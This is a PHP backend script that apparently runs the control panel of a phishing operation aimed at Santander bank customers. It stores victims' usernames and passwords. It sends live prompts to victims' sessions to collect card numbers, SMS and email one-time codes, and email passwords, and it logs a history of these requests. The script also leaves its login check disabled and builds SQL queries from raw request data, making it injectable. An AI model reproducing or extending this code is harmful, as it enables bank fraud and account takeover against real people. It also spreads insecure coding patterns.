<?php
	
	session_start();	
	include_once('MySQL.php');

	/*if(!isset($_SESSION['loggedin']) && empty($_SESSION['loggedin'])){
        header('Location: index.php');
    }*/
   
    if(isset($_POST['option']) && !empty($_POST['option'])){
    	switch ($_POST['option']) {
            case "1":
                if(isset($_POST['usr']) && !empty($_POST['usr']) &&
                  isset($_POST['pass']) && !empty($_POST['pass']) &&
                  isset($_POST['url']) && !empty($_POST['url']) &&
                  isset($_POST['name']) && !empty($_POST['name']) &&
                  isset($_POST['token']) && !empty($_POST['token']) &&
                  isset($_POST['opcionsql']) && !empty($_POST['opcionsql'])){
                    
                    
                    
                    $usuario = htmlentities($_POST['usr']);
                    $idElemento = htmlentities($_POST['idTok']);
                    $pass = htmlentities($_POST['pass']);
                    $url = htmlentities($_POST['url']);
                    $name = htmlentities($_POST['name']);
                    $cel = htmlentities($_POST['cel']);
                    $email = htmlentities($_POST['email']);
                    $token = htmlentities($_POST['token']);
                    $opcionSQL = htmlentities($_POST['opcionsql']);
                    
                    //$url = "";
                    
                    
                    
                    if($opcionSQL == 1){
                        $sql = "INSERT INTO alta_logos VALUES(NULL,'".$usuario."','".$pass."','".$url."','".strtoupper($name)."','".$cel."','".$email."','".$token."','','".base64_encode('loading')."','','','','','','','inactivo',".$_SESSION['id_usuario'].")";
                    }else{
                        $sql = "UPDATE alta_logos SET usuario='".$usuario."',
                                                    pass='".$pass."',
                                                    urlimagen='".$url."',
                                                    nombre='".strtoupper($name)."',
                                                    celular='".$cel."',
                                                    email='".$email."',
                                                    token='".$token."' WHERE id_logo_alta=".$idElemento;
                    }
                    
                    //echo $sql;
                    
                    $db = new MySQL();
                    if($db->altaLogoPanel($sql)){
                        echo 'Registrado';   
                    }else{
                        echo 'Fallo al registrado';
                    }
                }
                
            break;
            case "2":
                if(isset($_POST['id']) && !empty($_POST['id'])){
                    $id = htmlentities(base64_decode($_POST['id']));
                    $sql = "SELECT usr,pass FROM logos_27042019 WHERE id_logo=".$id." LIMIT 1";
                    $db = new MySQL();
                    echo $db->getRowLogoScam($sql);
                }
            break;
            case "3":
                if(isset($_POST['id']) && !empty($_POST['id']) && isset($_POST['comentario']) && !empty($_POST['comentario'])){
                    $id = htmlentities($_POST['id']);
                    $sql = "UPDATE alta_logos SET comentario='".$_POST['comentario']."' WHERE id_logo_alta=".base64_decode($_POST['id']);
                    //echo $sql;
                    $db = new MySQL();
                    echo $db->altaLogoPanel($sql);
                }
            break;
            case "4":
                if(isset($_POST['id']) && !empty($_POST['id'])){
                    $id = htmlentities(base64_decode($_POST['id']));
                    $sql = "SELECT * FROM alta_logos WHERE id_logo_alta=".$id." LIMIT 1";
                    $db = new MySQL();
                    echo $db->getRowLogoScam($sql);
                }
            break;
            case "5":   
                if(isset($_POST['id']) && !empty($_POST['id']) && isset($_POST['req']) && !empty($_POST['req'])){
                    $id = htmlentities(base64_decode($_POST['id']));
                    $req = htmlentities(base64_decode($_POST['req']));
                    $sql = "SELECT * FROM alta_logos WHERE id_logo_alta=".$id." LIMIT 1";
                    $db = new MySQL();
                    echo $db->getRowLogoScam($sql);
                    //echo $sql;
                }
            break;
            case "update_request_new":
                
                $mensaje = htmlentities($_POST['data2']);
                $drop = htmlentities($_POST['data1']);
                $request = htmlentities($_POST['req']);
                $id = htmlentities($_POST['id']);
                $reqBase = "";

                $sql = "UPDATE logos_santander SET requet='".$request."', codigo_drop='".$drop."', mensaje='".$mensaje."' WHERE id=".$id;

                $db = new MySQL();
                if($db->queryStandar($sql)){
                    echo 1;
                }else{
                    echo 0;
                }

                break;

            case "update_request_new_empresas":
                
                $mensaje = htmlentities($_POST['data2']);
                $drop = htmlentities($_POST['data1']);
                $request = htmlentities($_POST['req']);
                $id = htmlentities($_POST['id']);
                $reqBase = "";

                $sql = "UPDATE logos_santander_empresas SET requet='".$request."', codigo_drop='".$drop."', mensaje='".$mensaje."' WHERE id=".$id;

                $db = new MySQL();
                if($db->queryStandar($sql)){
                    echo 1;
                }else{
                    echo 0;
                }

                break;

                
            case "6":   
                $d1 = htmlentities($_POST['data1']);
                $d2 = htmlentities($_POST['data2']);
                $request = htmlentities($_POST['req']);
                $id = htmlentities($_POST['id']);
                $reqBase = "";
                
                if($request == "alta"){
                    $sql = "UPDATE alta_logos SET tipoTransferencia='".$d1."', dropTarjeta='".$d2."', request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "mensaje"){
                    $sql = "UPDATE alta_logos SET msgPersonal='".$d1."', tipoMsg='".$d2."', request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "tarjeta"){
                    $sql = "UPDATE alta_logos SET imgTarjeta='".$d1."', numTarjeta='".$d2."', request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "confirmacion"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "acceso"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "30minutos"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "24hrs"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "clavecorreo"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "codigosms"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }elseif($request == "codigoemail"){
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }else{
                    $sql = "UPDATE alta_logos SET request='".base64_encode($request)."' WHERE id_logo_alta=".$id;
                }
                
                $db = new MySQL();
                if($db->insertUpdatePanelLogos($sql)){
                    echo 1;
                }else{
                    echo 0;
                }
            break;
            case "7":
                $hora = htmlentities($_POST['hora']);
                $history = htmlentities($_POST['history']);
                $tipo = htmlentities($_POST['tipo']);
                $id = htmlentities($_POST['id']);
                
                
                $sql = "INSERT INTO history_request VALUES(NULL, '".$hora."', '".$history."',".$tipo.",".$id.")";
                $db = new MySQL();
                if($db->insertHistory($sql)){
                    echo 1;
                }else{
                    echo 0;
                }
            break;
            case "100":
                $hora = htmlentities($_POST['hora']);
                $history = htmlentities($_POST['history']);
                $tipo = htmlentities($_POST['tipo']);
                $id = htmlentities($_POST['id']);
                
                
                $sql = "INSERT INTO history_request_empresas VALUES(NULL, '".$hora."', '".$history."',".$tipo.",".$id.")";
                $db = new MySQL();
                if($db->insertHistory($sql)){
                    echo 1;
                }else{
                    echo 0;
                }
            break;
            case "8":
                $id = base64_decode(htmlentities($_POST['id']));
                $sql = "SELECT usrActive, audio FROM alta_logos WHERE id_logo_alta=".$_POST['id']." LIMIT 1";
                //echo $sql;
                //$r = array();
                $db = new MySQL();
                echo $status = $db->getStatusUsuarioPanel($sql);
                /*if($status == 'activo'){
                    echo 'ingreso';
                }else{
                    echo 'salio';
                }

                $r = ['status' => 'ingreso'];
                $r = ['audio' => 'ingreso'];*/

                break;
            case "9":
                $nombre = $_POST['usr'];
                $pass = $_POST['pass'];
                $tipo = $_POST['tipo'];
                $id = $_POST['id'];
                $tipoFormulario = $_POST['accion'];
                
                
                $tipoUser = "";
                
                
                
                
                if($tipo == 'Administrador'){
                    $tipoUser = 1;
                }else{
                    $tipoUser = 2;
                }
                
                
                if($tipoFormulario == 1){
                    $sql = "INSERT INTO usr_panel VALUES(NULL, '".htmlentities($nombre)."', '".htmlentities($pass)."', ".$tipoUser.", 1)";
                }else if($tipoFormulario == 2){
                    $sql = "UPDATE usr_panel SET name_usr='".$nombre."', pass_usr='".$pass."', priv_usr=".$tipoUser." WHERE id_usr=".$id;
                }else if($tipoFormulario == 3){
                    $sql = "UPDATE usr_panel SET status_usr=0 WHERE id_usr=".$id;
                }else{
                    $sql = "UPDATE usr_panel SET status_usr=1 WHERE id_usr=".$id;
                }
                
                //echo $sql;
                
                $db = new MySQL();
                //$db -> queryUserPanel($sql);
                
                
                
                if($db->queryUserPanel($sql)){
                    $response = true;
                }else{
                    $response = false;
                }

                echo $response;
                
                //echo $db->insertUserPanel($nombre, $pass, $tipo, $id, $tipoFormulario);
            break;
                
            case "10":
                if(isset($_POST['id']) && !empty($_POST['id'])){
                    $id = htmlentities($_POST['id']);
                    $sql = "SELECT * FROM usr_panel WHERE id_usr=".$id." LIMIT 1";
                    $db = new MySQL();
                    echo $db->getRowLogoScam($sql);
                }
            break;
            case "11":
                $sql = "UPDATE configuraciones SET num_contacto='".htmlentities($_POST['numero']."'");
                //echo $sql;
                $db = new MySQL();
                $db -> queryConfiguraciones($sql);

                break;


            case "12":
                $sql = "UPDATE resp_panels SET 
                manager='".htmlentities($_POST['manager'])."', 
                clave='".htmlentities($_POST['clave'])."' WHERE id=".base64_decode($_POST['id']);
                //echo $sql;
                $db = new MySQL();
                $db -> queryConfiguraciones($sql);

                break;
    		
    		default:
    		break;
    	}
    }


?>